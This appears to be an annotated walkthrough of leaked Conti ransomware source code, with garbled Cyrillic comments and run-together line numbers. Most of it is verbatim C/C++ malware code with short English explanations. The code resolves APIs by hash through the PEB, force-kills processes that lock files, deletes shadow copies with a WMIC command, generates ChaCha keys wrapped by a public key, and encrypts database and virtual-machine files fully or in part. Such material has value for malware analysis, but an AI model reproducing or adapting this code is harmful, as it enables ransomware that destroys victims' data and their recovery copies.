噤疱??漕徉怆屐 ?挲? Addr = GetProcAddressEx(Dll, ModuleId, Hash); morphcode(Addr); g_ApiCache[CacheIndex] = Addr; } return Addr;} GetForvardedProcfirst, this is the .dll string. 123456char szDll[] = { '.','c','k','m',0 };// 泽黻鲨 钺疣犷蜿?镥疱磬珥圜屙? 耧铕蜞// 袜 怩钿?漕腈磬 猁螯 耱痤赅 DllName.ProcName 桦?DllName.#ProcNomber--szDll[3];szDll[1]++;++szDll[2]; use the NameStr(ordNumber) to get each funtion of the dll. 123456789101112131415++NameStr; if (*NameStr == '#') { morphcode(*NameStr); // 褥 怆弪? 眍戾痤?趔黻鲨? ++NameStr; morphcode(*NameStr); DWORD OrdNomber = my_stoi(NameStr); morphcode(OrdNomber); return getapi::GetProcAddressEx(DLLName, 0, OrdNomber); or this will call this part of code, use the MurmurHash2A to import the function 12345DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);morphcode(Hash);return getapi::GetProcAddressEx(DLLName, 0, Hash); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758STATICLPVOIDGetForvardedProc(__in PCHAR Name){ char szDll[] = { '.','c','k','m',0 }; // 袜 怩钿?漕腈磬 猁螯 耱痤赅 DllName.ProcName 桦?DllName.#ProcNomber --szDll[3]; szDll[1]++; ++szDll[2]; morphcode(szDll); if (Name == NULL) return NULL; morphcode(Name); char DLLName[256]; //m_memset(DLLName, 0, sizeof(DLLName)); RtlSecureZeroMemory(DLLName, 256); morphcode(DLLName); PCHAR NameStr = FindChar(Name, '.'); if (!NameStr) return NULL; morphcode(NameStr); /// 杨徼疣屐 桁 徼犭桀蝈觇 m_memcpy(DLLName, Name, NameStr - Name); strcat(DLLName, szDll); /// 铒疱溴?屐 桁 趔黻鲨? ++NameStr; if (*NameStr == '#') { morphcode(*NameStr); // 褥 怆弪? 眍戾痤?趔黻鲨? ++NameStr; morphcode(*NameStr); DWORD OrdNomber = my_stoi(NameStr); morphcode(OrdNomber); return getapi::GetProcAddressEx(DLLName, 0, OrdNomber); } DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED); morphcode(Hash); return getapi::GetProcAddressEx(DLLName, 0, Hash);} CheckForForvardedProcused to check if the dll function is all imported. 12345678910111213141516BOOL CheckForForvardedProc(ADDR Addr, PIMAGE_EXPORT_DIRECTORY Table, DWORD DataSize){ if (Addr &gt; (ADDR)Table) { morphcode(Addr); if ((Addr - (ADDR)Table &lt; DataSize)) { morphcode(Table); return TRUE; } } return FALSE;} GetFunctionAddresss convert the function address that in the export function table. use the Ordinal to get the RVA RVA TO VA 12345678910ADDR GetFunctionAddresss(HMODULE Module, PIMAGE_EXPORT_DIRECTORY Table, LONG Ordinal){ PDWORD AddrTable = (PDWORD)RVATOVA(Module, Table-&gt;AddressOfFunctions); morphcode(AddrTable); DWORD RVA = AddrTable[Ordinal]; morphcode(RVA); ADDR Ret = (ADDR)RVATOVA(Module, RVA); morphcode(Ret); return Ret;} ReturnAddress this function is not called in the whole code. void CopyMemory( In PVOID Destination, In const VOID *Source, In SIZE_T Length ); get the first 4 byte of dwAddress, then temp+=1 ,to get the three byte code(I guess it is the jmp address).It’s will Maybe used in hook. 12345678910VOID ReturnAddress(PDWORD pAddress, DWORD dwAddress){ DWORD temp = dwAddress + 1; morphcode(temp); CopyMemory(&amp;temp, &amp;dwAddress, sizeof(DWORD)); morphcode(temp); temp++; CopyMemory(pAddress, &amp;temp, sizeof(DWORD)); morphcode(pAddress);} FindFunction this function is not called. return the Ordinary the hash in the Module’s export table. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556STATICINT FindFunction( __in HMODULE Module, __in DWORD Hash, __in PIMAGE_EXPORT_DIRECTORY Table ){ INT Ordinal = 0; morphcode(Ordinal); if (HIWORD(Hash) == 0) { // 腮屐 趔黻鲨?镱 甯 眍戾痼 Ordinal = (LOWORD(Hash)) - Table-&gt;Base; morphcode(Ordinal); } else { PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table-&gt;AddressOfNames); morphcode(NamesTable); PWORD OrdinalTable = (WORD*)RVATOVA(Module, Table-&gt;AddressOfNameOrdinals); morphcode(OrdinalTable); unsigned int i; char* ProcName; for (i = 0; i &lt; Table-&gt;NumberOfNames; ++i) { ProcName = (char*)RVATOVA(Module, *NamesTable); morphcode(ProcName); DWORD ProcHash = MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED); if (ProcHash == Hash) { morphcode(Ordinal); Ordinal = *OrdinalTable; break; } // 逾咫梓桠噱?镱玷鲨??蜞犭桷? ++NamesTable; ++OrdinalTable; } } return Ordinal;} GetApiAddrfind the ProcNameHash in the dll export function table, and then call function GetFunctionAddresss get the function address,and pass to the Next function CheckForForvardedProc CheckForForvardedProc check if the function is outside the export function table GetForvardedProc getapi::GetProcAddressEx(DLLName, 0, OrdNomber); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667ADDR GetApiAddr(HMODULE Module, DWORD ProcNameHash, ADDR* Address){ /*----------- 泽黻鲨 忸玮疣弪 噤疱?趔黻鲨?镱 甯 磬玮囗棹 -----------*/ // 项塍鬣屐 噤疱?漕镱腠栩咫 PE 玎泐腩怅钼 PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((char*)Module + ((PIMAGE_DOS_HEADER)Module)-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // 项塍鬣屐 噤疱?蜞犭桷?耧铕蜞 PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); DWORD DataSize = poh-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size; INT Ordinal; // 皖戾?礤钺躅滂祛?磬?趔黻鲨? BOOL Found = FALSE; if (HIWORD(ProcNameHash) == 0) { // 腮屐 趔黻鲨?镱 甯 眍戾痼 Ordinal = (LOWORD(ProcNameHash)) - Table-&gt;Base; } else { // 腮屐 趔黻鲨?镱 眍戾痼 PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table-&gt;AddressOfNames); PWORD OrdinalTable = (WORD*)RVATOVA(Module, Table-&gt;AddressOfNameOrdinals); unsigned int i; char* ProcName; for (i = 0; i &lt; Table-&gt;NumberOfNames; ++i) { ProcName = (char*)RVATOVA(Module, *NamesTable); if (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash) { Ordinal = *OrdinalTable; Found = TRUE; break; } // 逾咫梓桠噱?镱玷鲨??蜞犭桷? ++NamesTable; ++OrdinalTable; } } // 礤 磬?眍戾? if (!Found) { *Address = 0; return 0; } ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal); if (CheckForForvardedProc(Ret, Table, DataSize)) { Ret = (ADDR)GetForvardedProc((PCHAR)Ret); } //ReturnAddress(Address, Ret + 1); return Ret;} GetHashBaseget the Module Name ,generate and return the hash 12345678910111213141516171819202122GetHashBase(__in LDR_MODULE* mdll){ char name[64]; size_t i = 0; while (mdll-&gt;dllname.Buffer[i] &amp;&amp; i &lt; sizeof(name) - 1) { morphcode(mdll-&gt;dllname.Buffer[i]); name[i] = (char)mdll-&gt;dllname.Buffer[i]; morphcode(name[i]); i++; } name[i] = 0; return MurmurHash2A(name, StrLen(name), HASHING_SEED);} GetKernel32the peb is used to get the DllList.Loop the DllList and find the kernel32. 12345678910111213141516do{ mdl = (LDR_MODULE*)mdl-&gt;e[0].Flink; morphcode(mdl); if (mdl-&gt;base != nullptr) { morphcode(mdl-&gt;base); if (GetHashBase(mdl) == KERNEL32DLL_HASH) { // KERNEL32.DLL break; } }} while (mlink != (INT_PTR)mdl); then you can get the kernel32 handle with the base 1krnl32 = static_cast&lt;HMODULE&gt;(mdl-&gt;base); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546GetKernel32(){ HMODULE krnl32; PCWCHAR Kernel32Dll = OBFW(L&quot;Kernel32.dll&quot;);#ifdef _WIN64 const auto ModuleList = 0x18; const auto ModuleListFlink = 0x18; const auto KernelBaseAddr = 0x10; const INT_PTR peb = __readgsqword(0x60);#else int ModuleList = 0x0C; int ModuleListFlink = 0x10; int KernelBaseAddr = 0x10; INT_PTR peb = __readfsdword(0x30);#endif const auto mdllist = *(INT_PTR*)(peb + ModuleList); morphcode(mdllist); const auto mlink = *(INT_PTR*)(mdllist + ModuleListFlink); morphcode(mlink); auto krnbase = *(INT_PTR*)(mlink + KernelBaseAddr); morphcode(krnbase); auto mdl = (LDR_MODULE*)mlink; do { mdl = (LDR_MODULE*)mdl-&gt;e[0].Flink; morphcode(mdl); if (mdl-&gt;base != nullptr) { morphcode(mdl-&gt;base); if (GetHashBase(mdl) == KERNEL32DLL_HASH) { // KERNEL32.DLL break; } } } while (mlink != (INT_PTR)mdl); krnl32 = static_cast&lt;HMODULE&gt;(mdl-&gt;base); morphcode(krnl32); return krnl32;} hashMurmurHash2A convert to lowchar every 4 byte convert to unsigned int data ,then mmix with the seed. If the length is less than 4, Convert it one by one,then mmix ``` #define mmix(h,k) { k *= m; k ^= k &gt;&gt; r; k *= m; h *= m; h ^= k; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657- finally return the hash by argument h```c#include &quot;hash.h&quot;#include &quot;..\\memory.h&quot;#define mmix(h,k) { k *= m; k ^= k &gt;&gt; r; k *= m; h *= m; h ^= k; }#define LowerChar(C) if (C &gt;= 'A' &amp;&amp; C &lt;= 'Z') {C = C + ('a'-'A');}unsigned int MurmurHash2A(const void* key, int len, unsigned int seed){ char temp[64]; RtlSecureZeroMemory(temp, 64); memory::Copy(temp, (PVOID)key, len); for (int i = 0; i &lt; len; i++) { LowerChar(temp[i]); } const unsigned int m = 0x5bd1e995; const int r = 24; unsigned int l = len; const unsigned char* data = (const unsigned char*)temp; unsigned int h = seed; unsigned int k; while (len &gt;= 4) { k = *(unsigned int*)data; mmix(h, k); data += 4; len -= 4; } unsigned int t = 0; switch (len) { case 3: t ^= data[2] &lt;&lt; 16; case 2: t ^= data[1] &lt;&lt; 8; case 1: t ^= data[0]; }; mmix(h, t); mmix(h, l); h ^= h &gt;&gt; 13; h *= m; h ^= h &gt;&gt; 15; return h;} Cryptorcryptorcryptor::SetWhiteListProcessSet white list Process, pass the specifical process（explorer.exe）. 12345678910111213141516171819202122232425262728293031323334353637VOID process_killer::GetWhiteListProcess(__out PPID_LIST PidList){ HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapShot == NULL) { return; } PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W); if (!pProcess32FirstW(hSnapShot, &amp;pe32)) { pCloseHandle(hSnapShot); return; } do { if (!plstrcmpiW(pe32.szExeFile, OBFW(L&quot;explorer.exe&quot;))) { PPID Pid = (PPID)m_malloc(sizeof(PID)); if (!Pid) { break; } Pid-&gt;dwProcessId = pe32.th32ProcessID; TAILQ_INSERT_TAIL(PidList, Pid, Entries); } } while (pProcess32NextW(hSnapShot, &amp;pe32)); pCloseHandle(hSnapShot);} cryptor::ChangeFileNamejust change the filename, used to add the extension for Encrypted file. 123456789101112131415161718192021cryptor::ChangeFileName(__in LPCWSTR OldName){ LPWSTR NewName = (LPWSTR)memory::Alloc(32727); if (!NewName) { return FALSE; } morphcode((LPVOID)NewName); plstrcpyW(NewName, OldName); morphcode((LPVOID)NewName); plstrcatW(NewName, global::GetExtention()); morphcode((LPVOID)OldName); pMoveFileW(OldName, NewName); memory::Free(NewName); return TRUE;} cryptor::Encrypt Genkey OpenFileEncrypt CheckForDataBases WriteEncryptionInfo(FileInfo,FULL_ENCRYPT,0) EncryptFull CheckForVirtualMachines WriteEncryptionInfo(FileInfo,PARTLY_ENCRYPT,20) EncryptPartly judge the file size and use the fittest funtion to encrypt the different size range of file 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485BOOLcryptor::Encrypt( __in LPFILE_INFO FileInfo, __in LPBYTE Buffer, __in HCRYPTPROV CryptoProvider, __in HCRYPTKEY PublicKey){ BOOL Result = FALSE; DWORD BytesToRead = 0; LONGLONG TotalRead = 0; LONGLONG TotalWrite = 0; if (!GenKey(CryptoProvider, PublicKey, FileInfo)) { logs::Write(OBFW(L&quot;Can't gen key for file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } if (!OpenFileEncrypt(FileInfo)) { return FALSE; } if (CheckForDataBases(FileInfo-&gt;Filename)) { if (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, 0)) { return FALSE; } Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey); } else if (CheckForVirtualMachines(FileInfo-&gt;Filename)) { if (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, 20)) { return FALSE; } Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, 20); } else { if (FileInfo-&gt;FileSize &lt;= 1048576) { if (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, 0)) { return FALSE; } Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey); } else if (FileInfo-&gt;FileSize &lt;= 5242880) { if (!WriteEncryptInfo(FileInfo, HEADER_ENCRYPT, 0)) { return FALSE; } Result = EncryptHeader(FileInfo, Buffer, CryptoProvider, PublicKey); } else { if (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, global::GetEncryptSize())) { return FALSE; } Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, global::GetEncryptSize()); } } if (Result) { pCloseHandle(FileInfo-&gt;FileHandle); FileInfo-&gt;FileHandle = INVALID_HANDLE_VALUE; ChangeFileName(FileInfo-&gt;Filename); } CloseFile(FileInfo); return Result;} cryptor::DeleteShadowCopiesInitialize COM hres = (HRESULT)pCoInitializeEx(0, COINIT_MULTITHREADED) Set general COM security levelsRegisters security and sets the default security values for the process. 1234567891011pCoInitializeSecurity( NULL, -1, // COM authentication NULL, // Authentication services NULL, // Reserved RPC_C_AUTHN_LEVEL_DEFAULT, // Default authentication RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation NULL, // Authentication info EOAC_NONE, // Additional capabilities NULL // Reserved ); Obtain the initial locator to WMI Intel: pCoCreateInstance(CLSID_WbemLocator,0,CLSCTX_INPROC_SERVER,IID_IWbemLocator, (LPVOID*)&amp;pLoc); AMD: pCoCreateInstance(CLSID_WbemContext, 0, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&amp;pContext); BSTR Arch = pSysAllocString(OBFW(L”__ProviderArchitecture”)); hres = pContext-&gt;SetValue(Arch, 0, &amp;vArchitecture); 123456789101112131415161718192021222324252627282930313233343536373839404142434445IWbemLocator* pLoc = NULL; hres = (HRESULT)pCoCreateInstance( CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&amp;pLoc); morphcode(pLoc); IWbemContext* pContext = NULL; SYSTEM_INFO SysInfo; pGetNativeSystemInfo(&amp;SysInfo); morphcode(SysInfo.dwActiveProcessorMask); if (SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) { hres = (HRESULT)pCoCreateInstance(CLSID_WbemContext, 0, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&amp;pContext); if (FAILED(hres)) { pCoUninitialize(); return FALSE; } morphcode(hres); BSTR Arch = pSysAllocString(OBFW(L&quot;__ProviderArchitecture&quot;)); VARIANT vArchitecture; pVariantInit(&amp;vArchitecture); V_VT(&amp;vArchitecture) = VT_I4; V_INT(&amp;vArchitecture) = 64; hres = pContext-&gt;SetValue(Arch, 0, &amp;vArchitecture); morphcode(hres); pVariantClear(&amp;vArchitecture); if (FAILED(hres)) { pCoUninitialize(); return FALSE; // Program has failed. } } Connect to WMI through the IWbemLocator::ConnectServer methodThe WMI namespace root/cimv2 is the default namespace and contains classes for computer hardware and configuration. 12345678910111213141516171819202122BSTR Path = pSysAllocString(OBFW(L&quot;ROOT\\\\CIMV2&quot;)); hres = pLoc-&gt;ConnectServer( Path, // Object path of WMI namespace NULL, // User name. NULL = current user NULL, // User password. NULL = current 0, // Locale. NULL indicates current NULL, // Security flags. 0, // Authority (for example, Kerberos) pContext, // Context object &amp;pSvc // pointer to IWbemServices proxy ); morphcode(pSvc); if (FAILED(hres)) { pLoc-&gt;Release(); pCoUninitialize(); return FALSE; // Program has failed. } Set security levels on the proxy1234567891011121314151617181920hres = (HRESULT)pCoSetProxyBlanket( pSvc, // Indicates the proxy to set RPC_C_AUTHN_WINNT, // RPC_C_AUTHN_xxx RPC_C_AUTHZ_NONE, // RPC_C_AUTHZ_xxx NULL, // Server principal name RPC_C_AUTHN_LEVEL_CALL, // RPC_C_AUTHN_LEVEL_xxx RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx NULL, // client identity EOAC_NONE // proxy capabilities ); morphcode(hres); if (FAILED(hres)) { pSvc-&gt;Release(); pLoc-&gt;Release(); pCoUninitialize(); return FALSE; // Program has failed. } Use the IWbemServices pointer to make requests of WMI Get the data from the query in step 6this is the main code of the function 1234567891011121314151617181920BSTR WqlStr = pSysAllocString(OBFW(L&quot;WQL&quot;));BSTR Query = pSysAllocString(OBFW(L&quot;SELECT * FROM Win32_ShadowCopy&quot;));IEnumWbemClassObject* pEnumerator = NULL;hres = pSvc-&gt;ExecQuery( WqlStr, Query, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &amp;pEnumerator);morphcode(hres);if (FAILED(hres)){ pSvc-&gt;Release(); pLoc-&gt;Release(); pCoUninitialize(); return 1; // Program has failed.} get the data from the query and Delete the shadowcopy. generate the delete shadowcopy command, then use the Enumerator to delete every one of them. 12345678910111213141516171819202122232425262728293031323334353637383940414243IWbemClassObject* pclsObj = NULL; ULONG uReturn = 0; morphcode(pEnumerator); while (pEnumerator) { HRESULT hr = pEnumerator-&gt;Next(WBEM_INFINITE, 1, &amp;pclsObj, &amp;uReturn); morphcode(hr); if (0 == uReturn) { break; } VARIANT vtProp; // Get the value of the Name property hr = pclsObj-&gt;Get(OBFW(L&quot;ID&quot;), 0, &amp;vtProp, 0, 0); morphcode(hr); WCHAR CmdLine[1024]; RtlSecureZeroMemory(CmdLine, sizeof(CmdLine)); wsprintfW(CmdLine, OBFW(L&quot;cmd.exe /c C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe shadowcopy where \\&quot;ID='%s'\\&quot; delete&quot;), vtProp.bstrVal); morphcode(); LPVOID Old; pWow64DisableWow64FsRedirection(&amp;Old); morphcode(Old); CmdExecW(CmdLine); pWow64RevertWow64FsRedirection(Old); morphcode(Old); pVariantClear(&amp;vtProp); pclsObj-&gt;Release(); } Cleanup12345678if (pContext) { pContext-&gt;Release(); } pSvc-&gt;Release(); pLoc-&gt;Release(); pEnumerator-&gt;Release(); pCoUninitialize();} CmdExecWfirst set the STARTUPINFOW’s property——wShowWindow, then CreateProcess using the arg Cmdline passed in. CheckForDataBasesgenerate a long list of Extensions that are database.And check the file extension if in the Database Extension List. 12345678910INT Count = sizeof(Extensions) / sizeof(LPWSTR);for (INT i = 0; i &lt; Count; i++) { morphcode((LPVOID)Filename); if (pStrStrIW(Filename, Extensions[i])) { return TRUE; }} CheckForVirtualMachinesExtension OBFW(L”.vdi”),OBFW(L”.vhd”),OBFW(L”.vmdk”),OBFW(L”.pvm”),OBFW(L”.vmem”),OBFW(L”.vmsn”),OBFW(L”.vmsd”),OBFW(L”.nvram”),OBFW(L”.vmx”),OBFW(L”.raw”),OBFW(L”.qcow2”),OBFW(L”.subvol”),OBFW(L”.bin”),OBFW(L”.vsv”),OBFW(L”.avhd”),OBFW(L”.vmrs”),OBFW(L”.vhdx”),OBFW(L”.avdx”),OBFW(L”.vmcx”),OBFW(L”.iso”) then check the file extension if in the Virtual Machine Extension List. WriteFullDataa normal write function 12345678910111213141516171819202122232425262728293031323334353637383940STATICBOOLWriteFullData( __in HANDLE hFile, __in LPVOID Buffer, __in DWORD Size){ DWORD TotalWritten = 0; DWORD BytesWritten = 0; DWORD BytesToWrite = Size; DWORD Offset = 0; while (TotalWritten != Size) { morphcode(TotalWritten); if (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &amp;BytesWritten, NULL) || !BytesWritten) { return FALSE; } morphcode(BytesWritten); Offset += BytesWritten; morphcode(Offset); TotalWritten += BytesWritten; morphcode(BytesToWrite); BytesToWrite -= BytesWritten; } return TRUE;} KillFileOwnergetapi::IsRestartManagerLoaded() Restart Manager session，so how can we judge a session is loaded. We can find the code that modify the value in the anti-hook.cpp, if the Rstrtmgr.dll is loaded, this means the Manager session is loaded. pRmStartSessionStarts a new Restart Manager session. A maximum of 64 Restart Manager sessions per user session can be open on the system at the same time. When this function starts a session, it returns a session handle and session key that can be used in subsequent calls to the Restart Manager API. pRmRegisterResourcesRegisters resources to a Restart Manager session. The Restart Manager uses the list of resources registered with the session to determine which applications and services must be shut down and restarted。Resources can be identified by filenames, service short names, or RM_UNIQUE_PROCESS structures that describe running applications. The RmRegisterResources function can be used by a primary or secondary installer. pRmGetListGets a list of all applications and services that are currently using resources that have been registered with the Restart Manager session. pRmShutdownInitiates the shutdown of applications. This function can only be called from the installer that started the Restart Manager session using the RmStartSession function. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697BOOL KillFileOwner( __in LPCWSTR PathName){ if (!getapi::IsRestartManagerLoaded()) { logs::Write(OBFW(L&quot;Restart manager not loaded.&quot;)); return FALSE; } BOOL Result = FALSE; DWORD dwSession = 0x0; DWORD ret = 0; WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1]; RtlSecureZeroMemory(szSessionKey, sizeof(szSessionKey)); if (pRmStartSession(&amp;dwSession, 0x0, szSessionKey) == ERROR_SUCCESS) { if (pRmRegisterResources(dwSession, 1, &amp;PathName, 0, NULL, 0, NULL) == ERROR_SUCCESS) { DWORD dwReason = 0x0; UINT nProcInfoNeeded = 0; UINT nProcInfo = 0; PRM_PROCESS_INFO ProcessInfo = NULL; RtlSecureZeroMemory(&amp;ProcessInfo, sizeof(ProcessInfo)); ret = (DWORD)pRmGetList(dwSession, &amp;nProcInfoNeeded, &amp;nProcInfo, NULL, &amp;dwReason); if (ret != ERROR_MORE_DATA || !nProcInfoNeeded) { pRmEndSession(dwSession); return FALSE; } ProcessInfo = (PRM_PROCESS_INFO)memory::Alloc(sizeof(RM_PROCESS_INFO) * nProcInfoNeeded); if (!ProcessInfo) { pRmEndSession(dwSession); return FALSE; } nProcInfo = nProcInfoNeeded; ret = (DWORD)pRmGetList(dwSession, &amp;nProcInfoNeeded, &amp;nProcInfo, ProcessInfo, &amp;dwReason); if (ret != ERROR_SUCCESS || !nProcInfoNeeded) { memory::Free(ProcessInfo); pRmEndSession(dwSession); return FALSE; } DWORD ProcessId = (DWORD)pGetProcessId(pGetCurrentProcess()); for (INT i = 0; i &lt; nProcInfo; i++) { if (ProcessInfo[i].Process.dwProcessId == ProcessId) { memory::Free(ProcessInfo); pRmEndSession(dwSession); return FALSE; } process_killer::PPID Pid = NULL; TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) { if (ProcessInfo[i].Process.dwProcessId == Pid-&gt;dwProcessId) { memory::Free(ProcessInfo); pRmEndSession(dwSession); return FALSE; } } } Result = pRmShutdown(dwSession, RmForceShutdown, NULL) == ERROR_SUCCESS; memory::Free(ProcessInfo); } pRmEndSession(dwSession); } return Result;} GenKeyencrypt the public key. The first 32 bytes is the chacha encryption’s key, and the next 4 byte is the IV. 123456789101112131415161718192021222324252627282930313233343536373839STATICBOOLGenKey( __in HCRYPTPROV Provider, __in HCRYPTKEY PublicKey, __in cryptor::LPFILE_INFO FileInfo){ DWORD dwDataLen = 40; morphcode(FileInfo); if (!pCryptGenRandom(Provider, 32, FileInfo-&gt;ChachaKey)) { return FALSE; } morphcode(FileInfo-&gt;ChachaKey); if (!pCryptGenRandom(Provider, 8, FileInfo-&gt;ChachaIV)) { return FALSE; } morphcode(FileInfo-&gt;ChachaIV); RtlSecureZeroMemory(&amp;FileInfo-&gt;CryptCtx, sizeof(FileInfo-&gt;CryptCtx)); ECRYPT_keysetup(&amp;FileInfo-&gt;CryptCtx, FileInfo-&gt;ChachaKey, 256, 64); ECRYPT_ivsetup(&amp;FileInfo-&gt;CryptCtx, FileInfo-&gt;ChachaIV); memory::Copy(FileInfo-&gt;EncryptedKey, FileInfo-&gt;ChachaKey, 32); memory::Copy(FileInfo-&gt;EncryptedKey + 32, FileInfo-&gt;ChachaIV, 8); morphcode(FileInfo-&gt;EncryptedKey); if (!pCryptEncrypt(PublicKey, 0, TRUE, 0, FileInfo-&gt;EncryptedKey, &amp;dwDataLen, 524)) { return FALSE; } return TRUE;} CheckContiPatter g_ContiPattern is a global arg that has a certain value.Read 16 bytes of the file,And check with below. STATIC CONST BYTE g_ContiPattern[16] = { 0xab, 0xff, 0x63, 0xa1, 0x6f, 0xa2 , 0x6e, 0x6e, 0xa3, 0x74, 0x69, 0xbf, 0x4c, 0xdd, 0xff, 0xa1 }; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546STATICBOOLCheckContiPattern( __in cryptor::LPFILE_INFO FileInfo, __out PBOOL Error ){ LARGE_INTEGER Pointer; Pointer.QuadPart = -16; if (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Pointer, NULL, FILE_END)) { *Error = TRUE; return FALSE; } DWORD TotalRead = 0; DWORD BytesRead = 0; DWORD Offset = 0; DWORD BytesToRead = 16; BYTE Buffer[16]; RtlSecureZeroMemory(Buffer, sizeof(Buffer)); while (TotalRead != 16) { if (!pReadFile(FileInfo-&gt;FileHandle, Buffer + Offset, BytesToRead, &amp;BytesRead, NULL) || !BytesRead) { *Error = TRUE; return FALSE; } TotalRead += BytesRead; Offset += BytesRead; BytesToRead -= BytesRead; } *Error = FALSE; if (!memcmp(g_ContiPattern, Buffer, 16)) { return TRUE; } return FALSE;} WriteEncryptInfowrite the Encryption note to the txt. mainly use the pSetFilePointerEx to make it. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647STATICBOOLWriteEncryptInfo( __in cryptor::LPFILE_INFO FileInfo, __in BYTE EncryptMode, __in BYTE DataPercent){ BOOL Success; LARGE_INTEGER Offset; BYTE Buffer[10]; Buffer[0] = EncryptMode; Buffer[1] = DataPercent; memory::Copy(Buffer + 2, &amp;FileInfo-&gt;FileSize, 8); Offset.QuadPart = 0; if (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, NULL, FILE_END)) { logs::Write(OBFW(L&quot;Can't write key for file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } Success = WriteFullData(FileInfo-&gt;FileHandle, FileInfo-&gt;EncryptedKey, 524); if (!Success) { logs::Write(OBFW(L&quot;Can't write key for file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, 10); if (!Success) { logs::Write(OBFW(L&quot;Can't write key for file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } pSetEndOfFile(FileInfo-&gt;FileHandle); Success = (BOOL)pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, NULL, FILE_BEGIN); if (!Success) { logs::Write(OBFW(L&quot;Can't write key for file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); } return Success;} OpenFileEncryptpGetFileAttributesW pSetFileAttributesW FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL); KillFileOwner 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980STATICDWORDOpenFileEncrypt(__in cryptor::LPFILE_INFO FileInfo){ DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo-&gt;Filename); if (Attributes != INVALID_FILE_ATTRIBUTES) { if (Attributes &amp; FILE_ATTRIBUTE_READONLY) { pSetFileAttributesW(FileInfo-&gt;Filename, Attributes ^ FILE_ATTRIBUTE_READONLY); } } FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); DWORD LastError = (DWORD)pGetLastError(); if (FileInfo-&gt;FileHandle == INVALID_HANDLE_VALUE) { if (LastError == ERROR_SHARING_VIOLATION || LastError == ERROR_LOCK_VIOLATION) { logs::Write(OBFW(L&quot;File %s is already open by another program.&quot;), FileInfo-&gt;Filename); if (KillFileOwner(FileInfo-&gt;Filename)) { logs::Write(OBFW(L&quot;KillFileOwner for file %s - success&quot;), FileInfo-&gt;Filename); FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (FileInfo-&gt;FileHandle == INVALID_HANDLE_VALUE) { logs::Write(OBFW(L&quot;Can't open file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } } else { logs::Write(OBFW(L&quot;KillFileOwner for file %s - error. GetLastError = %lu.&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } } else { logs::Write(OBFW(L&quot;Can't open file %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); return FALSE; } } 